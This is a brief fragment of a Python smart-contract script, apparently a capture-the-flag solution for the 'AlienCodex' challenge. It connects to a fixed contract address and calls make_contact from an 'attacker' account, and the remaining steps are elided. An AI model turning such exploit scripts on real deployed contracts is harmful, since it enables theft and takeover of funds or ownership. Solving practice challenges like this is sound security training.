...
target_address='0xe6D3e5548359469182230A8555005Da968BdC5DD'
target_ct=interface.AlienCodex(target_address)
...
def main():
    ...
    tx=target_ct.make_contact({'from': attacker, 'priority_fee': priority_fee})
